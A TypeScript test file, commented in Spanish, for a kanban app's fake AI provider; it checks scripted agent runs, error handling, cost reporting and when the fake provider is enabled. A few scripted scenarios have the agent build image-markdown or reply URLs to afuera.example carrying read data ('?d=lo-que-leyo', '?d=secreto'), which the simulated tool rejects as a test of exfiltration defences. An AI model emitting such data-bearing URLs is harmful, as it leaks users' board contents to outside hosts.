// Pruebas del proveedor falso (falso.ts) y del registro (indice.ts): cada guion de 15.2 paso a paso, que no guarde estado,
// los errores «solo las primeras veces», el costo simulado y la regla de cuándo está disponible. El juego de contrato que
// comparte con los adaptadores reales está en contratos.prueba.ts. `npm run ia:probar-contratos`. Sin red.
import assert from 'node:assert/strict'
import { describe, test } from 'node:test'
import { ErrorDominio } from '../../dominio/servicio'
import { ErrorProveedor, type LlamadaHerramienta, type MensajeNeutro, type PedidoModelo, type Proveedor, type RespuestaModelo } from '../tipos'
import { crearProveedorFalso, leerModeloFalso, NOMBRES_DE_GUIONES, TITULO_TARJETA_DE_PRUEBA } from './falso'
import { falsoDisponible, proveedorDe, proveedoresDisponibles } from './indice'
import { costoUsd, precioDe } from './precios'

const CLAVE = 'prueba-CLAVE_DE_PRUEBA_0123456789'
const PEDIDO_TEXTO = 'Tarjeta RC-12 «El mozo tropieza». @claude mirá juego3d/ui/barrio.js y decime qué falta.'

/** Lo que devuelve «la herramienta» para cada llamada en la simulación. */
type Simulada = (l: LlamadaHerramienta) => { texto: string; esError?: boolean }

const TARJETA = JSON.stringify({ clave: 'RC-12', titulo: 'El mozo tropieza con las mesas', lista: 'Por hacer' })
const DE_FABRICA: Simulada = (l) => {
  if (l.nombre === 'leer_tarjeta') return { texto: TARJETA }
  if (l.nombre === 'crear_tarjeta') return { texto: JSON.stringify({ ok: true, mensaje: 'Creé RC-130.', clave: 'RC-130' }) }
  if (l.nombre === 'crear_marco') return { texto: 'Creé el marco m_3fkq2a9b «Marco de prueba».\nCapas (2): g1a2b3 Fondo, g4c5d6 Titulo\nhttps://telarapp.vercel.app/…' }
  return { texto: JSON.stringify({ ok: true }) }
}

interface Paso { r: RespuestaModelo; resultados: string[] }

/** Hace correr un guion: pide, «ejecuta» las herramientas con `simular`, devuelve el resultado, y repite hasta que conteste o se pase de `max`. */
async function correr(p: Proveedor, modelo: string, o: { texto?: string; simular?: Simulada; max?: number; historialInicial?: string[] } = {}): Promise<Paso[]> {
  const modeloPedido = { modelo }
  const fijo = p.prepararFijo({ sistema: [{ texto: 'Sos un agente.' }], herramientas: [{ nombre: 'leer_tarjeta', descripcion: '', esquema: {} }], modelo })
  const historial = [...(o.historialInicial ?? []), p.aNativo({ rol: 'usuario', partes: [{ tipo: 'texto', texto: o.texto ?? PEDIDO_TEXTO }] }, modeloPedido)]
  const pasos: Paso[] = []
  for (let i = 0; i < (o.max ?? 12); i++) {
    const pedido: PedidoModelo = { modelo, maxSalida: 4096, fijo, historial: [...historial], clave: CLAVE, senal: new AbortController().signal, leerImagen: async () => new Uint8Array() }
    const r = await p.llamar(pedido)
    historial.push(r.nativo)
    if (r.llamadas.length === 0) {
      pasos.push({ r, resultados: [] })
      break
    }
    const simulados = r.llamadas.map((l) => (o.simular ?? DE_FABRICA)(l))
    const m: MensajeNeutro = {
      rol: 'herramienta',
      resultados: r.llamadas.map((l, k) => ({ id: l.id, nombre: l.nombre, esError: simulados[k]!.esError ?? false, partes: [{ tipo: 'texto', texto: simulados[k]!.texto }] })),
    }
    historial.push(p.aNativo(m, modeloPedido))
    pasos.push({ r, resultados: simulados.map((s) => s.texto) })
  }
  return pasos
}

const herramientasDe = (pasos: Paso[]) => pasos.flatMap((p) => p.r.llamadas.map((l) => l.nombre))
const textoFinal = (pasos: Paso[]) => pasos[pasos.length - 1]!.r.texto

describe('falso · los guiones de 15.2', () => {
  const p = crearProveedorFalso()

  test('responder: contesta sin herramientas', async () => {
    const pasos = await correr(p, 'guion:responder')
    assert.equal(pasos.length, 1)
    assert.equal(textoFinal(pasos), 'Respuesta de prueba.')
    assert.equal(pasos[0]!.r.corte, 'fin')
  })

  test('leer-y-responder: lee la tarjeta del contexto y nombra su título', async () => {
    const pasos = await correr(p, 'guion:leer-y-responder')
    assert.deepEqual(herramientasDe(pasos), ['leer_tarjeta'])
    assert.deepEqual(pasos[0]!.r.llamadas[0]!.argumentos, { tarjeta: 'RC-12' })
    assert.match(textoFinal(pasos), /El mozo tropieza con las mesas/)
  })

  test('leer-y-responder sin tarjeta en el pedido: lo dice y no llama a nada', async () => {
    const pasos = await correr(p, 'guion:leer-y-responder', { texto: 'hola, ¿cómo andás?' })
    assert.deepEqual(herramientasDe(pasos), [])
    assert.match(textoFinal(pasos), /No encontré ninguna tarjeta/)
  })

  test('mover: mueve la tarjeta a «Hecho» y contesta', async () => {
    const pasos = await correr(p, 'guion:mover')
    assert.deepEqual(pasos[0]!.r.llamadas.map((l) => [l.nombre, l.argumentos]), [['mover_tarjeta', { tarjeta: 'RC-12', lista: 'Hecho' }]])
    assert.match(textoFinal(pasos), /Moví RC-12 a Hecho/)
  })

  test('crear: crea una tarjeta y contesta con su clave', async () => {
    const pasos = await correr(p, 'guion:crear')
    assert.deepEqual(pasos[0]!.r.llamadas.map((l) => [l.nombre, l.argumentos]), [['crear_tarjeta', { titulo: TITULO_TARJETA_DE_PRUEBA }]])
    assert.equal(textoFinal(pasos), 'Creé RC-130.')
  })

  for (const guion of ['crear', 'verifica']) {
    test(`${guion}: si no sabe si se creó, busca antes de repetir (y no la crea dos veces)`, async () => {
      const simular: Simulada = (l) => {
        if (l.nombre === 'crear_tarjeta') return { texto: 'No sé si esta acción llegó a hacerse: el proceso se cortó mientras la corría.', esError: true }
        return { texto: JSON.stringify({ resultados: [{ clave: 'RC-131', titulo: TITULO_TARJETA_DE_PRUEBA }] }) }
      }
      const pasos = await correr(p, `guion:${guion}`, { simular })
      assert.deepEqual(herramientasDe(pasos), ['crear_tarjeta', 'buscar'])
      assert.match(textoFinal(pasos), /Ya estaba creada \(RC-131\)/)
    })

    test(`${guion}: si busca y no está, ahí sí la crea`, async () => {
      let creadas = 0
      const simular: Simulada = (l) => {
        if (l.nombre === 'crear_tarjeta') return ++creadas === 1 ? { texto: 'No sé si esta acción llegó a hacerse.', esError: true } : { texto: '{"clave":"RC-140"}' }
        return { texto: JSON.stringify({ resultados: [] }) }
      }
      const pasos = await correr(p, `guion:${guion}`, { simular })
      assert.deepEqual(herramientasDe(pasos), ['crear_tarjeta', 'buscar', 'crear_tarjeta'])
      assert.equal(textoFinal(pasos), 'Creé RC-140.')
    })
  }

  test('archivar: archiva y lo dice; si no pudo (permiso, «No»), también', async () => {
    const bien = await correr(p, 'guion:archivar')
    assert.deepEqual(bien[0]!.r.llamadas.map((l) => l.nombre), ['archivar_tarjeta'])
    assert.equal(textoFinal(bien), 'Archivé RC-12.')
    const mal = await correr(p, 'guion:archivar', { simular: () => ({ texto: 'El agente no tiene permiso para archivar.', esError: true }) })
    assert.match(textoFinal(mal), /No pude archivar RC-12: El agente no tiene permiso/)
  })

  test('diagrama: arma 3 objetos y 2 conectores, relee el lienzo y contesta', async () => {
    const pasos = await correr(p, 'guion:diagrama')
    assert.deepEqual(herramientasDe(pasos), ['armar_en_lienzo', 'leer_lienzo'])
    const a = pasos[0]!.r.llamadas[0]!.argumentos as { objetos: unknown[]; conectores: unknown[] }
    assert.equal(a.objetos.length, 3)
    assert.equal(a.conectores.length, 2)
  })

  test('disenar: crear_marco, ver_diseno, editar_marco, ver_diseno y contesta (con los ids que leyó)', async () => {
    const pasos = await correr(p, 'guion:disenar')
    assert.deepEqual(herramientasDe(pasos), ['crear_marco', 'ver_diseno', 'editar_marco', 'ver_diseno'])
    const todas = pasos.flatMap((x) => x.r.llamadas)
    assert.deepEqual(todas[1]!.argumentos, { marco: 'm_3fkq2a9b' })
    assert.deepEqual(todas[2]!.argumentos, { marco: 'm_3fkq2a9b', operaciones: [{ op: 'texto', capa: 'g4c5d6', texto: 'Hola, Telar' }] })
    assert.match(textoFinal(pasos), /Creé el marco/)
  })

  test('bucle: llama a leer_tablero siempre, sin terminar', async () => {
    const pasos = await correr(p, 'guion:bucle', { max: 8 })
    assert.equal(pasos.length, 8)
    assert.ok(pasos.every((x) => x.r.llamadas.length === 1 && x.r.llamadas[0]!.nombre === 'leer_tablero'))
    assert.equal(new Set(pasos.map((x) => x.r.llamadas[0]!.id)).size, 8, 'cada llamada con su id')
  })

  test('caro: cada pedido informa USD 0,60 (según los precios del proveedor falso); después de tres lecturas, contesta', async () => {
    const pasos = await correr(p, 'guion:caro')
    assert.equal(pasos.length, 4)
    const precio = precioDe('falso', 'guion:caro')!
    for (const x of pasos) assert.equal(costoUsd(precio, x.r.uso), 0.6)
    assert.equal(textoFinal(pasos), 'Listo, fue caro.')
    // con otro monto y otra cantidad de lecturas
    const mas = await correr(p, 'guion:caro:0.75:1')
    assert.equal(mas.length, 2)
    assert.equal(costoUsd(precio, mas[0]!.r.uso), 0.75)
  })

  test('lento: tarda lo que se le configura y respeta la señal de aborto', async () => {
    const chico = crearProveedorFalso({ retrasoMs: 40 })
    const t = Date.now()
    await correr(chico, 'guion:lento')
    assert.ok(Date.now() - t >= 35, 'esperó')
    const c = new AbortController()
    const fijo = p.prepararFijo({ sistema: [], herramientas: [], modelo: 'guion:lento' })
    const promesa = p.llamar({ modelo: 'guion:lento', maxSalida: 10, fijo, historial: [p.aNativo({ rol: 'usuario', partes: [{ tipo: 'texto', texto: 'x' }] }, { modelo: '' })], clave: CLAVE, senal: c.signal, leerImagen: async () => new Uint8Array() })
    setTimeout(() => c.abort(), 20)
    const e = await promesa.then(() => null, (x) => x)
    assert.ok(e instanceof ErrorProveedor && e.tipo === 'tiempo')
  })

  test('url-armada: intenta comentar con una imagen de una dirección que arma él, con un dato adentro, y cuenta cómo le fue', async () => {
    const pasos = await correr(p, 'guion:url-armada', { texto: 'Tarjeta RC-12 «El mozo».', simular: () => ({ texto: 'Esa dirección no salió del tablero ni del pedido: https://afuera.example/p.png?d=lo-que-leyo', esError: true }) })
    const a = pasos[0]!.r.llamadas[0]!
    assert.equal(a.nombre, 'comentar')
    assert.match(String((a.argumentos as { texto: string }).texto), /!\[gráfico\]\(https:\/\/afuera\.example\/p\.png\?d=lo-que-leyo\)/)
    assert.match(textoFinal(pasos), /^Resultado: Esa dirección no salió del tablero/)
  })

  test('imagen-armada y url-en-respuesta: la imagen que salió de un dato, y la respuesta con una dirección inventada y otra del pedido', async () => {
    const img = await correr(p, 'guion:imagen-armada', { texto: 'Tarjeta RC-12.', simular: () => ({ texto: 'ok' }) })
    assert.match(String((img[0]!.r.llamadas[0]!.argumentos as { texto: string }).texto), /de-datos\.example\/img\.png/)
    assert.equal(textoFinal(img), 'Comenté.')
    const r = await correr(p, 'guion:url-en-respuesta')
    assert.match(textoFinal(r), /afuera\.example\/armada\?d=secreto.*www\.ejemplo-del-pedido\.com\/x/)
  })

  test('dos-llamadas, codigo-muchas, triage-mueve, resumen y los errores «siempre»', async () => {
    assert.deepEqual(herramientasDe(await correr(p, 'guion:dos-llamadas', { texto: 'RC-12' })), ['leer_tarjeta', 'buscar'])
    const muchas = await correr(p, 'guion:codigo-muchas:13', { simular: () => ({ texto: 'ok' }) })
    assert.equal(muchas[0]!.r.llamadas.length, 13, 'trece lecturas en un solo paso')
    assert.deepEqual(herramientasDe(await correr(p, 'guion:triage-mueve', { texto: 'Tarjeta RC-105', simular: () => ({ texto: 'Hecho.' }) })), ['mover_tarjeta'])
    assert.equal(textoFinal(await correr(p, 'guion:resumen')), 'Resumen del día: nada trabado.')
    for (let i = 0; i < 4; i++) {
      const e = await correr(p, 'guion:error-sobrecarga-siempre').then(() => null, (x) => x)
      assert.ok(e instanceof ErrorProveedor && e.tipo === 'sobrecarga' && e.reintentable, 'falla siempre, las veces que se pida')
    }
  })

  test('menciona-ia: contesta mencionando a otro agente (gpt, o el que diga el parámetro)', async () => {
    assert.equal(textoFinal(await correr(p, 'guion:menciona-ia')), 'Gracias. @gpt, ¿podés mirar esto?')
    assert.equal(textoFinal(await correr(p, 'guion:menciona-ia:gemini')), 'Gracias. @gemini, ¿podés mirar esto?')
  })

  test('codigo: ve la carpeta, lee el archivo del pedido, busca y mira los cambios', async () => {
    const pasos = await correr(p, 'guion:codigo')
    assert.deepEqual(herramientasDe(pasos), ['codigo_ver', 'codigo_leer', 'codigo_buscar', 'codigo_cambios'])
    const [ver, leer] = pasos.flatMap((x) => x.r.llamadas)
    assert.deepEqual(ver!.argumentos, { ruta: 'juego3d/ui' })
    assert.deepEqual(leer!.argumentos, { ruta: 'juego3d/ui/barrio.js', desde: 1, hasta: 40 })
    assert.match(textoFinal(pasos), /Miré el código de juego3d\/ui\/barrio\.js/)
  })

  test('triage: lee la tarjeta y contesta con «Revisado», recomendación y respuesta para Discord (esa respuesta es el comentario); no mueve nada', async () => {
    const proveedor = crearProveedorFalso({ ahora: () => new Date('2026-11-25T12:00:00Z') })
    const pasos = await correr(proveedor, 'guion:triage', { texto: 'Tarjeta nueva RC-105 en Bandeja (Discord).' })
    assert.deepEqual(herramientasDe(pasos), ['leer_tarjeta'])
    const texto = textoFinal(pasos)
    assert.match(texto, /^\*\*Revisado \d{1,2}\/\d{1,2}:\*\*/)
    assert.match(texto, /RC-105/)
    assert.match(texto, /\*\*Recomendación:\*\*/)
    assert.match(texto, /\*\*Respuesta para Discord\*\*/)
    assert.ok(!texto.includes('@'), 'la proactividad no menciona a nadie')
  })

  test('triage:mueve además la mueve a «Por hacer»', async () => {
    const pasos = await correr(p, 'guion:triage:mueve', { texto: 'RC-105' })
    assert.deepEqual(herramientasDe(pasos), ['leer_tarjeta', 'mover_tarjeta'])
    assert.match(textoFinal(pasos), /^\*\*Revisado/)
  })

  test('todos los guiones nombrados en el plan existen', () => {
    for (const g of ['responder', 'leer-y-responder', 'mover', 'crear', 'archivar', 'diagrama', 'disenar', 'bucle', 'caro', 'lento', 'error-429', 'error-sobrecarga', 'error-clave', 'error-pedido', 'url-armada', 'menciona-ia', 'verifica', 'codigo', 'triage', 'triage-mueve', 'resumen', 'dos-llamadas', 'error-sobrecarga-siempre', 'url-en-respuesta', 'imagen-armada', 'codigo-muchas']) {
      assert.ok(NOMBRES_DE_GUIONES.includes(g), g)
    }
  })
})

describe('falso · sin estado, errores y clave', () => {
  test('no guarda estado: dos instancias, el mismo historial, la misma respuesta (un trabajo retomado en otro proceso sigue por donde iba)', async () => {
    const a = crearProveedorFalso()
    const b = crearProveedorFalso()
    const pa = await correr(a, 'guion:leer-y-responder')
    // el proceso «se cae» después del primer pedido: la otra instancia sigue con lo guardado
    const modelo = 'guion:leer-y-responder'
    const fijo = a.prepararFijo({ sistema: [], herramientas: [], modelo })
    const historial = [
      a.aNativo({ rol: 'usuario', partes: [{ tipo: 'texto', texto: PEDIDO_TEXTO }] }, { modelo }),
      pa[0]!.r.nativo,
      a.aNativo({ rol: 'herramienta', resultados: [{ id: pa[0]!.r.llamadas[0]!.id, nombre: 'leer_tarjeta', esError: false, partes: [{ tipo: 'texto', texto: TARJETA }] }] }, { modelo }),
    ]
    const r = await b.llamar({ modelo, maxSalida: 10, fijo, historial, clave: CLAVE, senal: new AbortController().signal, leerImagen: async () => new Uint8Array() })
    assert.equal(r.texto, pa[1]!.r.texto)
    assert.deepEqual(r.uso, pa[1]!.r.uso)
  })

  test('uso: el primer pedido escribe caché y los que siguen lo leen', async () => {
    const pasos = await correr(crearProveedorFalso(), 'guion:leer-y-responder')
    assert.ok(pasos[0]!.r.uso.cacheEscritura > 0 && pasos[0]!.r.uso.cacheLectura === 0)
    assert.ok(pasos[1]!.r.uso.cacheLectura > 0 && pasos[1]!.r.uso.cacheEscritura === 0)
  })

  const ERRORES = [
    ['error-429', 'limite', true],
    ['error-sobrecarga', 'sobrecarga', true],
    ['error-clave', 'clave', false],
    ['error-pedido', 'pedido', false],
  ] as const
  for (const [guion, tipo, reintentable] of ERRORES) {
    test(`${guion}: tira un ErrorProveedor «${tipo}» ${reintentable ? 'las dos primeras veces y después contesta' : 'siempre'}`, async () => {
      const p = crearProveedorFalso()
      const intento = () => correr(p, `guion:${guion}`, { max: 1 })
      for (let i = 0; i < (reintentable ? 2 : 4); i++) {
        const e = await intento().then(() => null, (x) => x)
        assert.ok(e instanceof ErrorProveedor, `intento ${i + 1}`)
        assert.equal(e.tipo, tipo)
        assert.equal(e.reintentable, reintentable)
        assert.ok(e.paraLaPersona.length > 5)
      }
      if (reintentable) assert.equal(textoFinal(await intento()), 'Respuesta tras el error.')
      p.reiniciar()
      if (reintentable) assert.ok((await intento().then(() => null, (x) => x)) instanceof ErrorProveedor, 'reiniciar() vuelve a contar desde cero')
    })
  }

  test('rechaza una clave que no empieza con «prueba-», sin repetirla', async () => {
    const p = crearProveedorFalso()
    const mala = 'sk-ant-api03-ESTA_NO_ES_DE_PRUEBA_000'
    const fijo = p.prepararFijo({ sistema: [], herramientas: [], modelo: 'guion:responder' })
    const e = await p.llamar({ modelo: 'guion:responder', maxSalida: 10, fijo, historial: [], clave: mala, senal: new AbortController().signal, leerImagen: async () => new Uint8Array() }).then(() => null, (x) => x)
    assert.ok(e instanceof ErrorProveedor && e.tipo === 'clave' && !e.reintentable)
    assert.ok(!JSON.stringify([e.message, e.paraLaPersona]).includes(mala))
    const prueba = await p.probar({ clave: mala })
    assert.equal(prueba.ok, false)
    assert.ok(!JSON.stringify(prueba).includes(mala))
    assert.equal((await p.probar({ clave: CLAVE })).ok, true)
  })

  test('un guion que no existe es un error de pedido, no un cuelgue', async () => {
    const p = crearProveedorFalso()
    const e = await correr(p, 'guion:no-existe', { max: 1 }).then(() => null, (x) => x)
    assert.ok(e instanceof ErrorProveedor && e.tipo === 'pedido')
    const f = await correr(p, 'claude-opus-5-5', { max: 1 }).then(() => null, (x) => x)
    assert.ok(f instanceof ErrorProveedor && f.tipo === 'pedido')
  })

  test('«-ciego» en el guion: el modelo no ve imágenes', () => {
    const p = crearProveedorFalso()
    assert.equal(p.capacidades('guion:disenar').imagenes, true)
    assert.equal(p.capacidades('guion:disenar').imagenesEnResultados, true)
    assert.equal(p.capacidades('guion:disenar-ciego').imagenes, false)
    assert.equal(p.capacidades('guion:disenar-ciego').imagenesEnResultados, false)
    assert.deepEqual(leerModeloFalso('guion:disenar-ciego'), { nombre: 'disenar', ciego: true, param: undefined })
    assert.deepEqual(leerModeloFalso('guion:menciona-ia:claude'), { nombre: 'menciona-ia', ciego: false, param: 'claude' })
    assert.equal(leerModeloFalso('claude-opus-5-5'), null)
  })
})

describe('registro · cuándo hay proveedor falso', () => {
  test('falsoDisponible: solo con TABLERO_IA_FALSO=1 y fuera de Vercel, nunca dentro', () => {
    assert.equal(falsoDisponible({}), false)
    assert.equal(falsoDisponible({ TABLERO_IA_FALSO: '0' }), false)
    assert.equal(falsoDisponible({ TABLERO_IA_FALSO: '1' }), true)
    assert.equal(falsoDisponible({ TABLERO_IA_FALSO: '1', TABLERO_PUBLICO: '1' }), true, 'las pruebas de cuentas levantan Telar «público» en la computadora')
    assert.equal(falsoDisponible({ TABLERO_IA_FALSO: '1', VERCEL: '1' }), false, 'en Vercel, nunca por sí solo')
    assert.equal(falsoDisponible({ TABLERO_IA_FALSO: '1', VERCEL_ENV: 'production' }), false)
    assert.equal(falsoDisponible({ TABLERO_IA_FALSO: '1', VERCEL: '1', TABLERO_IA_FALSO_EN_VERCEL: '1' }), false, 'ninguna variable lo habilita en Vercel')
    assert.equal(falsoDisponible({ VERCEL: '1', TABLERO_IA_FALSO_EN_VERCEL: '1' }), false)
  })

  test('proveedorDe: Anthropic, OpenAI y «compatible» siempre; el falso solo si está habilitado', () => {
    assert.equal(proveedorDe('anthropic', { env: {} }).id, 'anthropic')
    assert.equal(proveedorDe('anthropic', { env: { VERCEL: '1' } }).id, 'anthropic')
    assert.equal(proveedorDe('falso', { env: { TABLERO_IA_FALSO: '1' } }).id, 'falso')
    assert.throws(() => proveedorDe('falso', { env: {} }), (e) => e instanceof ErrorDominio && /solo para pruebas/.test(e.message))
    assert.throws(() => proveedorDe('falso', { env: { TABLERO_IA_FALSO: '1', VERCEL: '1' } }), ErrorDominio)
    assert.equal(proveedorDe('openai', { env: {} }).id, 'openai')
    assert.equal(proveedorDe('compatible', { env: { VERCEL: '1' } }).id, 'compatible')
  })

  test('el mismo proceso siempre recibe el mismo proveedor falso (lleva la cuenta de los errores)', () => {
    const env = { TABLERO_IA_FALSO: '1' }
    assert.equal(proveedorDe('falso', { env }), proveedorDe('falso', { env }))
    assert.notEqual(proveedorDe('falso', { env }), proveedorDe('falso', { env: { ...env, TABLERO_IA_FALSO_RETRASO_MS: '25' } }))
  })

  test('proveedoresDisponibles', () => {
    assert.deepEqual(proveedoresDisponibles({ env: {} }), ['anthropic', 'openai', 'compatible'])
    assert.deepEqual(proveedoresDisponibles({ env: { TABLERO_IA_FALSO: '1' } }), ['anthropic', 'openai', 'compatible', 'falso'])
    assert.deepEqual(proveedoresDisponibles({ env: { TABLERO_IA_FALSO: '1', VERCEL: '1' } }), ['anthropic', 'openai', 'compatible'], 'en Vercel, nunca el falso')
  })
})
